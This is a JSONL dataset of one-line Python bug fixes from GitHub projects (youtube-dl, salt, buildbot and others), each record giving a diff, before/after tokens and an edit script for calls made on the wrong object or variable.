{"project": "gdshelpers", "commit_sha": "15f40e2eefaa67ad203f76dd9229f6b32bd8b31c", "parent_sha": "8ff40a4f6efd14d587fe13ec017239e838303497", "file_path": "gdshelpers/layout/write_field.py", "project_url": "https://github.com/HelgeGehring/gdshelpers", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def annotate_write_fields(cell, origin='left-top', end='right-bottom', size=100,\n     }\n \n     assert type(origin) in [list, tuple] or origin in corner_labels.keys(), \\\n-        'origin must either be a tuple or one of %s' % origin.keys()\n+        'origin must either be a tuple or one of %s' % corner_labels.keys()\n     assert type(end) in [list, tuple] or end in corner_labels.keys(), \\\n         'origin must either be a tuple or one of %s' % corner_labels.keys()\n     assert size > 0, 'Write field alignment must be a number greater 0'\n", "before": "assert type ( origin ) in [ list , tuple ] or origin in corner_labels . keys ( ) , 'origin must either be a tuple or one of %s' % origin . keys ( )", "after": "assert type ( origin ) in [ list , tuple ] or origin in corner_labels . keys ( ) , 'origin must either be a tuple or one of %s' % corner_labels . keys ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:origin\", 3, 56, 3, 62], \"corner_labels\"]]"}
{"project": "Pointnet2.ScanNet", "commit_sha": "b1eaaeec527abe89004fe63cf5ca83b1df33c7d4", "parent_sha": "ec3de66e6f6378d98197078764ff4c4fd0820e32", "file_path": "lib/dataset.py", "project_url": "https://github.com/daveredrum/Pointnet2.ScanNet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class ScannetDataset():\n             self.scene_data[scene_id] = scene_data\n \n             if self.use_multiview:\n-                feature = scene_features.get(scene_id)[()]\n+                feature = multiview_database.get(scene_id)[()]\n                 self.multiview_data[scene_id] = feature\n \n         if self.is_weighting:\n", "before": "feature = scene_features . get ( scene_id ) [ ( ) ]", "after": "feature = multiview_database . get ( scene_id ) [ ( ) ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:scene_features\", 3, 27, 3, 41], \"multiview_database\"]]"}
{"project": "atm-py", "commit_sha": "03106e3a739e1e60fcca05f26c0c8fc36ac74363", "parent_sha": "1e8f14440b44089c4fd6d7bf24e2c82a1856e741", "file_path": "atmPy/aerosols/instruments/piccolo/piccolo.py", "project_url": "https://github.com/hagne/atm-py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def _read_file(fname):\n \n     data.sort_index(inplace=True)\n \n-    return time_series.TimeSeries(data, {'original header': header})\n+    return timeseries.TimeSeries(data, {'original header': header})\n \n \n def read_csv(fname):\n", "before": "return time_series . TimeSeries ( data , { 'original header' : header } )", "after": "return timeseries . TimeSeries ( data , { 'original header' : header } )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:time_series\", 3, 12, 3, 23], \"timeseries\"]]"}
{"project": "SpeakyBuild", "commit_sha": "fe696c7364070f991f6f513c504767c403416c48", "parent_sha": "3f5034d05fdbf466455fbca3de22e8e6779b1101", "file_path": "scenes/start.py", "project_url": "https://github.com/Stimul8d/SpeakyBuild", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4,7 +4,7 @@ import unicornhat as UH\n import time\n \n def go():\n-    unicorn.brightness(1)\n+    UH.brightness(1)\n     for y in range(8):\n         for x in range(8):\n             UH.set_pixel(x,y,50,50,255)\n", "before": "unicorn . brightness ( 1 )", "after": "UH . brightness ( 1 )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:unicorn\", 3, 5, 3, 12], \"UH\"]]"}
{"project": "odoo-saas-tools", "commit_sha": "f2fcd447e63f1a38ec2d12643522e398d89cc0d2", "parent_sha": "82be0de52727aa3174ebb00154605612f23e4b2b", "file_path": "saas_server/controllers/main.py", "project_url": "https://github.com/QinerTech/odoo-saas-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -203,7 +203,7 @@ class AuthSignupHome(auth_signup.controllers.main.AuthSignupHome):\n             f_dbname = '%s.%s' % (qcontext['dbname'], self.get_saas_domain())\n             full_dbname = f_dbname.replace('www.', '').replace('.', '_')\n             db_exists = openerp.service.db.exp_db_exist(full_dbname)\n-            assert re.match('[a-zA-Z0-9_-]+$', values.get('dbname'))== False, \"The domain name can only contain letters or numbers\"\n+            assert re.match('[a-zA-Z0-9_-]+$', qcontext.get('dbname'))== False, \"The domain name can only contain letters or numbers\"\n             assert db_exists == False, \"Domain exists\"\n         assert any([k for k in values.values()]), \"The form was not properly filled in.\"\n         assert values.get('password') == qcontext.get('confirm_password'), \"Passwords do not match; please retype them.\"\n", "before": "assert re . match ( '[a-zA-Z0-9_-]+$' , values . get ( 'dbname' ) ) == False , \"The domain name can only contain letters or numbers\"", "after": "assert re . match ( '[a-zA-Z0-9_-]+$' , qcontext . get ( 'dbname' ) ) == False , \"The domain name can only contain letters or numbers\"", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:values\", 3, 48, 3, 54], \"qcontext\"]]"}
{"project": "odoo-saas-tools", "commit_sha": "e72bd452d7546e072de2615114b4ed5fd39d4e27", "parent_sha": "3a82d45ae7f10f3f62a4873c3055423b4623e93f", "file_path": "saas_portal/models/saas_portal.py", "project_url": "https://github.com/QinerTech/odoo-saas-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -471,7 +471,7 @@ class SaasPortalClient(models.Model):\n             'e': client.expiration_datetime,\n             'r': '%s://%s:%s/web' % (scheme, port, client.name),\n         }\n-        sstate.update({'db_template': self.name,\n+        state.update({'db_template': self.name,\n                       'disable_mail_server' : True})\n         scope = ['userinfo', 'force_login', 'trial', 'skiptheuse']\n         url = server._request(path='/saas_server/new_database',\n", "before": "sstate . update ( { 'db_template' : self . name , 'disable_mail_server' : True } )", "after": "state . update ( { 'db_template' : self . name , 'disable_mail_server' : True } )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:sstate\", 3, 9, 3, 15], \"state\"]]"}
{"project": "youtube-dl", "commit_sha": "07e40358799158e51453e2d2c493d265a495b9e0", "parent_sha": "d0efb9ec9a85662fa43f026339821513ac2f039c", "file_path": "youtube_dl/extractor/viki.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class VikiIE(SubtitlesInfoExtractor):\n         if uploader_m is None:\n             uploader = None\n         else:\n-            uploader = uploader.group(1).strip()\n+            uploader = uploader_m.group(1).strip()\n \n         rating_str = self._html_search_regex(\n             r'<strong>Rating: </strong>\\s*([^<]*)<', webpage,\n", "before": "uploader = uploader . group ( 1 ) . strip ( )", "after": "uploader = uploader_m . group ( 1 ) . strip ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:uploader\", 3, 24, 3, 32], \"uploader_m\"]]"}
{"project": "youtube-dl", "commit_sha": "4958ae205873980189793885824418533cd27041", "parent_sha": "7e8d73c18378ea469b8f1a2185768b16e5b5c947", "file_path": "youtube_dl/extractor/francetv.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class FranceTVBaseInfoExtractor(InfoExtractor):\n         manifest_url = info.find('videos/video/url').text\n         manifest_url = manifest_url.replace('/z/', '/i/')\n         \n-        if url.startswith('rtmp'):\n+        if manifest_url.startswith('rtmp'):\n             formats = [{'url': manifest_url, 'ext': 'flv'}]\n         else:\n             formats = []\n", "before": "if url . startswith ( 'rtmp' ) : formats = [ { 'url' : manifest_url , 'ext' : 'flv' } ] else : formats = [ ]", "after": "if manifest_url . startswith ( 'rtmp' ) : formats = [ { 'url' : manifest_url , 'ext' : 'flv' } ] else : formats = [ ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:url\", 3, 12, 3, 15], \"manifest_url\"]]"}
{"project": "youtube-dl", "commit_sha": "4d8ee01389c4229f14fad45f0aa7b033a2509aef", "parent_sha": "d01924f48810db69d572bc121ab98021f04ac957", "file_path": "youtube_dl/extractor/viki.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -157,7 +157,7 @@ class VikiIE(VikiBaseIE):\n             title = 'Episode %d' % video.get('number') if video.get('type') == 'episode' else video.get('id') or video_id\n             container_titles = video.get('container', {}).get('titles')\n             if container_titles:\n-                container_title = container_titles.get('en') or container_titles[titles.keys()[0]]\n+                container_title = container_titles.get('en') or container_titles[container_titles.keys()[0]]\n                 title = '%s - %s' % (container_title, title)\n \n         descriptions = video.get('descriptions')\n", "before": "container_title = container_titles . get ( 'en' ) or container_titles [ titles . keys ( ) [ 0 ] ]", "after": "container_title = container_titles . get ( 'en' ) or container_titles [ container_titles . keys ( ) [ 0 ] ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:titles\", 3, 82, 3, 88], \"container_titles\"]]"}
{"project": "youtube-dl", "commit_sha": "655470825231eaa03b4b82cbc1314d551e72a01e", "parent_sha": "0a2e1b2e30045de7834aca880d35253c5e8a3812", "file_path": "youtube_dl/extractor/kaltura.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -324,7 +324,7 @@ class KalturaIE(InfoExtractor):\n         if captions:\n             for caption in captions.get('objects', []):\n                 # Continue if caption is not ready\n-                if f.get('status') != 2:\n+                if caption.get('status') != 2:\n                     continue\n                 if not caption.get('id'):\n                     continue\n", "before": "if f . get ( 'status' ) != 2 : continue", "after": "if caption . get ( 'status' ) != 2 : continue", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:f\", 3, 20, 3, 21], \"caption\"]]"}
{"project": "tweepy", "commit_sha": "125480c0f1a6fd9bb259b4741e1985c02155744c", "parent_sha": "31a351c665ad8675a10b52351feecf8c9d24ba53", "file_path": "tweepy/models.py", "project_url": "https://github.com/uberVU/tweepy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class Status(Model):\n                 else:\n                     setattr(status, k, v)\n             elif k == 'retweeted_status':\n-                setattr(status, k, User.parse(api, v))\n+                setattr(status, k, Status.parse(api, v))\n             else:\n                 setattr(status, k, v)\n         return status\n", "before": "elif k == 'retweeted_status' : setattr ( status , k , User . parse ( api , v ) )", "after": "elif k == 'retweeted_status' : setattr ( status , k , Status . parse ( api , v ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:User\", 3, 36, 3, 40], \"Status\"]]"}
{"project": "buildbot", "commit_sha": "f8d972155fe7edd5ca0c030f5bad6a364dc0d5d4", "parent_sha": "c6e3fe47a3be550d501b111b817246dac7dcd9d1", "file_path": "master/buildbot/status/web/console.py", "project_url": "https://github.com/longaccess/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -592,7 +592,7 @@ class ConsoleStatusResource(HtmlResource):\n             except ValueError:\n                 pass\n \n-        req.setHeader('Cache-Control', 'no-cache')\n+        request.setHeader('Cache-Control', 'no-cache')\n \n         # Sets the default reload time to 60 seconds.\n         if not reload_time:\n", "before": "req . setHeader ( 'Cache-Control' , 'no-cache' )", "after": "request . setHeader ( 'Cache-Control' , 'no-cache' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:req\", 3, 9, 3, 12], \"request\"]]"}
{"project": "buildbot", "commit_sha": "2e22c0f336f3f7193588b8f7ba77ca71c8d068be", "parent_sha": "f8d972155fe7edd5ca0c030f5bad6a364dc0d5d4", "file_path": "master/buildbot/status/web/buildstatus.py", "project_url": "https://github.com/longaccess/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class BuildStatusStatusResource(HtmlResource):\n \n         status = self.getStatus(request)\n-        req.setHeader('Cache-Control', 'no-cache')\n+        request.setHeader('Cache-Control', 'no-cache')\n \n         # Get the parameters.\n         name = request.args.get(\"builder\", [None])[0]\n", "before": "req . setHeader ( 'Cache-Control' , 'no-cache' )", "after": "request . setHeader ( 'Cache-Control' , 'no-cache' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:req\", 2, 9, 2, 12], \"request\"]]"}
{"project": "cclib", "commit_sha": "6a3d32fb4af96947a5ef577043441e24faa96ff6", "parent_sha": "c0b0ba45ad02d1c1758c910378c016122b280e72", "file_path": "test/regression.py", "project_url": "https://github.com/chemistry-scripts/cclib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -478,7 +478,7 @@ def testGaussian_Gaussian09_issue_460_log(logfile):\n     assert hasattr(logfile.data, 'scfvalues')\r\n     assert logfile.data.scfvalues[0][0, 0] == 3.37e-03\r\n-    assert np.isnan(logfile.data.scfvalues[0][0, 2])\r\n+    assert numpy.isnan(logfile.data.scfvalues[0][0, 2])\r\n \r\n def testGaussian_Gaussian09_OPT_td_g09_out(logfile):\r\n     \"\"\"Couldn't find etrotats as G09 has different output than G03.\"\"\"\r\n", "before": "assert np . isnan ( logfile . data . scfvalues [ 0 ] [ 0 , 2 ] )", "after": "assert numpy . isnan ( logfile . data . scfvalues [ 0 ] [ 0 , 2 ] )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:np\", 2, 12, 2, 14], \"numpy\"]]"}
{"project": "pyethereum", "commit_sha": "54554a56983b381b083ec22da8a87884600a4a29", "parent_sha": "950d15f57b4aedb4ded9b438ec41208649b193b2", "file_path": "ethereum/chain.py", "project_url": "https://github.com/PabloLefort/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -294,7 +294,7 @@ class Chain(object):\n             # if unsuccessful the prerequisites were not fullfilled\n             # and the tx is invalid, state must not have changed\n             log.debug('invalid tx', error=e)\n-            assert transaction not in self.get_transactions()\n+            assert transaction not in head_candidate.get_transactions()\n             head_candidate.state_root = old_state_root  # reset\n             return False\n \n", "before": "assert transaction not in self . get_transactions ( )", "after": "assert transaction not in head_candidate . get_transactions ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 39, 3, 43], \"head_candidate\"]]"}
{"project": "revelation", "commit_sha": "8b439c0c2de5e2f8219957aa53024920bdd47a32", "parent_sha": "2ee54f56e77671681261276ce1d2487ccedde9e7", "file_path": "src/bundle/luks.py", "project_url": "https://github.com/nicfit/revelation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -183,7 +183,7 @@ class LuksFile:\n \n \t\t# generate the master key digest\n \t\tpbkdf = PBKDFv2.PBKDFv2()\n-\t\tself.mkDigest = pbkdf.makeKey(self.masterKey, self.mkDigestSalt, self.mkDigestIterations, haslib.new(self.hashSpec).digest_size, self.hashSpec)\n+\t\tself.mkDigest = pbkdf.makeKey(self.masterKey, self.mkDigestSalt, self.mkDigestIterations, hashlib.new(self.hashSpec).digest_size, self.hashSpec)\n \n \t\t# init the key information\n \t\tcurrentSector = math.ceil(592.0 / self.SECTOR_SIZE)\n", "before": "self . mkDigest = pbkdf . makeKey ( self . masterKey , self . mkDigestSalt , self . mkDigestIterations , haslib . new ( self . hashSpec ) . digest_size , self . hashSpec )", "after": "self . mkDigest = pbkdf . makeKey ( self . masterKey , self . mkDigestSalt , self . mkDigestIterations , hashlib . new ( self . hashSpec ) . digest_size , self . hashSpec )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:haslib\", 3, 93, 3, 99], \"hashlib\"]]"}
{"project": "stbgui", "commit_sha": "03840de4f14dbbbbb6d4d38c862a0a1cceba5ea7", "parent_sha": "655e73ee9f55d730071bed6278c9cb83af80d1f7", "file_path": "lib/python/Plugins/SystemPlugins/SatelliteEquipmentControl/plugin.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ def SecSetupStart(menuid):\n \treturn [ ]\n \n def Plugins(**kwargs):\n-\tif (nimmanager.hasNimType(\"DVB-S\")):\n+\tif (nimmgr.hasNimType(\"DVB-S\")):\n \t\treturn PluginDescriptor(name=_(\"Satellite Equipment Setup\"), description=\"Setup your satellite equipment\", where = PluginDescriptor.WHERE_SETUP, fnc=SecSetupStart)\n \telse:\n \t\treturn []\n", "before": "if ( nimmanager . hasNimType ( \"DVB-S\" ) ) : return PluginDescriptor ( name = _ ( \"Satellite Equipment Setup\" ) , description = \"Setup your satellite equipment\" , where = PluginDescriptor . WHERE_SETUP , fnc = SecSetupStart ) else : return [ ]", "after": "if ( nimmgr . hasNimType ( \"DVB-S\" ) ) : return PluginDescriptor ( name = _ ( \"Satellite Equipment Setup\" ) , description = \"Setup your satellite equipment\" , where = PluginDescriptor . WHERE_SETUP , fnc = SecSetupStart ) else : return [ ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:nimmanager\", 3, 6, 3, 16], \"nimmgr\"]]"}
{"project": "wcgbrowser", "commit_sha": "aa94c988a76b1278ccd54a72b973390e94d8612a", "parent_sha": "6fdf88cca591ffca6367f3f74181c8f78839aba4", "file_path": "browser.py", "project_url": "https://github.com/zhangzhenxing84/wcgbrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -647,7 +647,7 @@ class WcgWebView(QWebView):\n         super(WcgWebView, self).__init__(parent)\n         self.kwargs = kwargs\n         self.config = config\n-        self.nam = (config.get('networkAccessManager')\n+        self.nam = (kwargs.get('networkAccessManager')\n                     or QNetworkAccessManager())\n         self.setPage(WCGWebPage(config=config))\n         self.page().setNetworkAccessManager(self.nam)\n", "before": "self . nam = ( config . get ( 'networkAccessManager' ) or QNetworkAccessManager ( ) )", "after": "self . nam = ( kwargs . get ( 'networkAccessManager' ) or QNetworkAccessManager ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:config\", 3, 21, 3, 27], \"kwargs\"]]"}
{"project": "scikit-bio", "commit_sha": "ddbb615e3d3dba44dd6afbe51f68aba5b863fc55", "parent_sha": "3980f63d8ec3d0bc5df89149983960eec1b633f5", "file_path": "bipy/maths/stats/ordination/canonical_correspondence_analysis.py", "project_url": "https://github.com/iskandr/scikit-bio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ class CCA(Ordination):\n         vt_res = vt_res[:rank]\n \n         U_res = vt_res.T\n-        U_hat_res = Q_bar.dot(U_res) * s_res**-1\n+        U_hat_res = Y_res.dot(U_res) * s_res**-1\n \n         # Storing values needed to compute scores\n         iter_ = (('column_marginals', column_marginals),\n", "before": "U_hat_res = Q_bar . dot ( U_res ) * s_res ** - 1", "after": "U_hat_res = Y_res . dot ( U_res ) * s_res ** - 1", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:Q_bar\", 3, 21, 3, 26], \"Y_res\"]]"}
{"project": "st2", "commit_sha": "45f427bbca2748ea07f69d21436e9ce9dd62d555", "parent_sha": "6fcaa4934658c4c3ed1b74d0dcb8ecd536386525", "file_path": "contrib/packs/actions/pack_mgmt/download.py", "project_url": "https://github.com/ojosdegris/st2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class DownloadGitRepoAction(Action):\n             packs = os.listdir(abs_local_path)\n         for pack in packs:\n             abs_pack_temp_location = os.path.join(abs_local_path, pack) if subtree else abs_local_path\n-            desired, message = InstallGitRepoAction._is_desired_pack(abs_pack_temp_location, pack)\n+            desired, message = DownloadGitRepoAction._is_desired_pack(abs_pack_temp_location, pack)\n             if desired:\n                 to = abs_repo_base\n                 dest_pack_path = os.path.join(abs_repo_base, pack)\n", "before": "desired , message = InstallGitRepoAction . _is_desired_pack ( abs_pack_temp_location , pack )", "after": "desired , message = DownloadGitRepoAction . _is_desired_pack ( abs_pack_temp_location , pack )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:InstallGitRepoAction\", 3, 32, 3, 52], \"DownloadGitRepoAction\"]]"}
{"project": "my.osmc", "commit_sha": "e28faaa3a0e053f8611b8f72656cbf79e82cb4ab", "parent_sha": "f6c4856f259ee4532c04a4839cbdc54ed87130a2", "file_path": "script.module.osmcsetting.networking/resources/osmc/OSMCSetting.py", "project_url": "https://github.com/osmc/my.osmc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -273,7 +273,7 @@ class OSMCSettingClass(threading.Thread):\n \t\treturn osmc_network.has_network_connection(online)\n \n \tdef is_ftr_running():\n-\t\t\treturn osmc_netwok.is_ftr_running(self)\n+\t\treturn osmc_network.is_ftr_running(self)\n \n \t##############################################################################################################################\n \t#\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t #\n", "before": "return osmc_netwok . is_ftr_running ( self )", "after": "return osmc_network . is_ftr_running ( self )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:osmc_netwok\", 3, 11, 3, 22], \"osmc_network\"]]"}
{"project": "openeo-grassgis-driver", "commit_sha": "98f7b0acd31c34235d73a3b9b8820f4d8131b822", "parent_sha": "a20f52ecfd658d8c0bd230e9a3ba74f2cd73db6c", "file_path": "src/openeo_grass_gis_driver/processes.py", "project_url": "https://github.com/Open-EO/openeo-grassgis-driver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ __email__ = \"soerengebbert@googlemail.com\"\n class Processes(Resource):\n \n     def __init__(self):\n-        ResourceBase.__init__(self)\n+        Resource.__init__(self)\n \n     def get(self):\n \n", "before": "ResourceBase . __init__ ( self )", "after": "Resource . __init__ ( self )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:ResourceBase\", 3, 9, 3, 21], \"Resource\"]]"}
{"project": "django-tutorial", "commit_sha": "72b4b4ddea5b90e415fa3b2f77ad593d5cac285d", "parent_sha": "d5e18f8caa9d1506351492df945d4de74ce18326", "file_path": "mysite/polls/models.py", "project_url": "https://github.com/laviniaclare/django-tutorial", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class Question(models.Model):\n         return self.question_text\n \n     def was_published_recently(self):\n-        now = datetime.now()\n+        now = timezone.now()\n         return now >= self.pub_date >= now - datetime.timedelta(days=1)\n \n \n", "before": "now = datetime . now ( )", "after": "now = timezone . now ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:datetime\", 3, 15, 3, 23], \"timezone\"]]"}
{"project": "salt", "commit_sha": "459ea026ca52ddb3946b34c847c2e52d3a4a5db4", "parent_sha": "89a492df86867815fcc1f104de890091b84ab39d", "file_path": "salt/returners/etcd_return.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ def returner(ret):\n     # Update the given minion in the external job cache with the current (latest job)\n     # This is used by get_fun() to return the last function that was called\n     minionp = '/'.join([path, 'minions', ret['id']])\n-    jid.debug(\"sdstack_etcd returner <returner> updating (last) job id (ttl={ttl:d}) of {id:s} at {path:s} with job {jid:s}\".format(jid=ret['jid'], id=ret['id'], path=minionp, ttl=ttl))\n+    log.debug(\"sdstack_etcd returner <returner> updating (last) job id (ttl={ttl:d}) of {id:s} at {path:s} with job {jid:s}\".format(jid=ret['jid'], id=ret['id'], path=minionp, ttl=ttl))\n     res = client.set(minionp, ret['jid'], ttl=ttl)\n     if hasattr(res, '_prev_node'):\n         log.trace(\"sdstack_etcd returner <returner> the previous job id {old:s} for {id:s} at {path:s} was set to {new:s}\".format(old=res._prev_node.value, id=ret['id'], path=minionp, new=res.value))\n", "before": "jid . debug ( \"sdstack_etcd returner <returner> updating (last) job id (ttl={ttl:d}) of {id:s} at {path:s} with job {jid:s}\" . format ( jid = ret [ 'jid' ] , id = ret [ 'id' ] , path = minionp , ttl = ttl ) )", "after": "log . debug ( \"sdstack_etcd returner <returner> updating (last) job id (ttl={ttl:d}) of {id:s} at {path:s} with job {jid:s}\" . format ( jid = ret [ 'jid' ] , id = ret [ 'id' ] , path = minionp , ttl = ttl ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:jid\", 3, 5, 3, 8], \"log\"]]"}
{"project": "salt", "commit_sha": "c3a543b3e7b5533875363fbb4121636acda75c9e", "parent_sha": "2a850bc6cbc1971cba930caff895b7275c1656ae", "file_path": "salt/modules/lxc.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -624,7 +624,7 @@ class _LXCConfig(object):\n         filtered = []\n         for item in self.data:\n             if not re.match('^' + pat, item[0]):\n-                item.append(item)\n+                filtered.append(item)\n             else:\n                 removed.append(item)\n         self.data = filtered\n", "before": "item . append ( item )", "after": "filtered . append ( item )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:item\", 3, 17, 3, 21], \"filtered\"]]"}
{"project": "yowsup", "commit_sha": "dec71efb6b692f7a30b4e968427bd99c1b90b3ed", "parent_sha": "bc0b4b041f54a3b8042ad408dbcc21437ad7fa8b", "file_path": "yowsup/demos/cli/layer.py", "project_url": "https://github.com/AlsunniNet/yowsup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -353,7 +353,7 @@ class YowsupCliLayer(Cli, YowInterfaceLayer):\n             messageOut = self.getMediaMessageBody(message)\n         else:\n             messageOut = \"Unknown message type %s \" % message.getType()\n-            print(messageOut.toProtocolTreeNode())\n+            print(message.toProtocolTreeNode())\n \n \n         formattedDate = datetime.datetime.fromtimestamp(message.getTimestamp()).strftime('%d-%m-%Y %H:%M')\n", "before": "print ( messageOut . toProtocolTreeNode ( ) )", "after": "print ( message . toProtocolTreeNode ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:messageOut\", 3, 19, 3, 29], \"message\"]]"}
{"project": "extension_registry.py", "commit_sha": "05b0adc8d8e0542bfa74fe64c52c350a04bdf3ca", "parent_sha": "279dcb9d1c9c94e39a4b937018eddf5722d9d5f6", "file_path": "ocdsextensionregistry/cli/commands/generate_data_file.py", "project_url": "https://github.com/open-contracting/extension_registry.py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class Command(BaseCommand):\n             elif default_minor_version in versions:\n                 latest_version = default_minor_version\n             else:\n-                dated = [kv for kv in version.items() if kv[1]['date']]\n+                dated = [kv for kv in versions.items() if kv[1]['date']]\n                 if dated:\n                     latest_version = max(dated, key=lambda kv: kv[1]['date'])[0]\n                 else:\n", "before": "else : dated = [ kv for kv in version . items ( ) if kv [ 1 ] [ 'date' ] ]", "after": "else : dated = [ kv for kv in versions . items ( ) if kv [ 1 ] [ 'date' ] ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:version\", 3, 39, 3, 46], \"versions\"]]"}
{"project": "nvda", "commit_sha": "1e7e972b583910452dc23ec6d7c41659e20ab92e", "parent_sha": "68c9e9607f4dbaca626cc79ce673d3aa44b9e26a", "file_path": "source/keyboardHandler.py", "project_url": "https://github.com/mariuszkrzaczkowski/nvda", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def internal_keyDownEvent(event):\n def speakKey(keyPress,ascii):\r\n \tglobal word\r\n \tif ascii==32 and ((config.conf[\"keyboard\"][\"speakTypedCharacters\"] and not config.conf[\"keyboard\"][\"speakTypedWords\"]) or (config.conf[\"keyboard\"][\"speakTypedCharacters\"] and config.conf[\"keyboard\"][\"speakTypedWords\"] and (len(word)==0))):\r\n-\t\taudio.speakSymbol(chr(ascii))\r\n+\t\tspeech.speakSymbol(chr(ascii))\r\n \tif ((keyPress[0] is None) or (keyPress[0]==frozenset(['Shift'])) or (keyPress[0]==frozenset(['Control','Alt']))) and (ascii in range(33,255)):\r\n \t\tif isTypingProtected():\r\n \t\t\tchar=\"*\"\r\n", "before": "audio . speakSymbol ( chr ( ascii ) )", "after": "speech . speakSymbol ( chr ( ascii ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:audio\", 3, 3, 3, 8], \"speech\"]]"}
